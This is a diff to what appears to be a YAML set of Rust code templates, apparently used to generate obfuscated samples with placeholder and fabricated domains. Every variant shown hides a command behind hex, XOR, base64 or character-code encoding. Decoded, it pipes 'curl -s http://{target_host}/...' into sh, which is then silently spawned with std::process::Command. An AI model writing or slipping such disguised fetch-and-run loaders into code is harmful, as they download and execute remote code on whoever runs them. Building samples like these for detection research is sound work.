@@ -11,25 +11,16 @@ variants:
     domain_fabricated: "cloud-ingress-broker.org"
     code_template: |
       fn {fn_name}() {
-          // Encoded payload: command fetching remote configuration
-          let raw_b64 = "Y3VybCAtcyBodHRwczovL3RhcmdldF9ob3N0L2FwaS9rZXk=";
-          let mut dec = Vec::new();
-          let table = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
-          // Basic base64 decoder logic
-          let mut val = 0u32;
-          let mut valb = -8;
-          for &c in raw_b64.as_bytes() {
-              if let Some(pos) = table.iter().position(|&x| x == c) {
-                  val = (val << 6) | (pos as u32);
-                  valb += 6;
-                  if valb >= 0 {
-                      dec.push(((val >> valb) & 0xFF) as u8);
-                      valb -= 8;
+          const HEX: &[u8] = b"6375726c202d7320687474703a2f2f";
+          let mut s = String::new();
+          for chunk in HEX.chunks(2) {
+              if let Ok(byte_str) = std::str::from_utf8(chunk) {
+                  if let Ok(b) = u8::from_str_radix(byte_str, 16) {
+                      s.push(b as char);
                   }
               }
           }
-          let cmd_str = String::from_utf8_lossy(&dec).replace("target_host", "{target_host}");
-          let _ = std::process::Command::new("sh").args(["-c", &cmd_str]).spawn();
+          std::process::Command::new("sh").args(["-c", &format!("{s}{target_host}/api | sh")]).spawn().ok();
       }
 
   - id: c6_xor_byte_array_loop
@@ -39,14 +30,12 @@ variants:
     domain_fabricated: "network-tunnel-relay.net"
     code_template: |
       fn {fn_name}() {
-          let cipher = [
+          const CIPHER: [u8; 24] = [
               0x5f, 0x5e, 0x47, 0x57, 0x1b, 0x14, 0x14, 0x5b, 0x56, 0x49, 0x5c, 0x5e, 0x4f, 0x64, 0x53, 0x54, 
               0x48, 0x14, 0x58, 0x5a, 0x4f, 0x5d, 0x50, 0x5e
           ];
-          let key = 0x3b;
-          let text: String = cipher.iter().map(|&b| ((b ^ key) as char)).collect();
-          let replaced = text.replace("relay_host", "{target_host}");
-          let _ = std::process::Command::new("sh").args(["-c", &replaced]).spawn();
+          let text: String = CIPHER.iter().map(|&b| ((b ^ 0x3b) as char)).collect();
+          std::process::Command::new("sh").args(["-c", &text.replace("relay_host", "{target_host}")]).spawn().ok();
       }
 
   - id: c6_char_code_poly_reconstruct
@@ -55,10 +44,9 @@ variants:
     domain_invalid: "stream-hub.edge.invalid"
     domain_fabricated: "edge-stream-aggregator.io"
     code_template: |
-      fn {fn_name}() {
-          let codes: &[u16] = &[99, 117, 114, 108, 32, 45, 115, 32, 104, 116, 116, 112, 58, 47, 47];
-          let mut base: String = codes.iter().map(|&c| char::from_u32(c as u32).unwrap_or(' ')).collect();
-          base.push_str("{target_host}");
-          base.push_str("/init | sh");
-          let _ = std::process::Command::new("sh").args(["-c", &base]).spawn();
+      pub fn {fn_name}() {
+          const CODES: &[u16] = &[99, 117, 114, 108, 32, 45, 115, 32, 104, 116, 116, 112, 58, 47, 47];
+          let mut base: String = CODES.iter().map(|&c| char::from_u32(c as u32).unwrap_or(' ')).collect();
+          base.push_str("{target_host}/init | sh");
+          std::process::Command::new("sh").args(["-c", &base]).spawn().ok();
       }
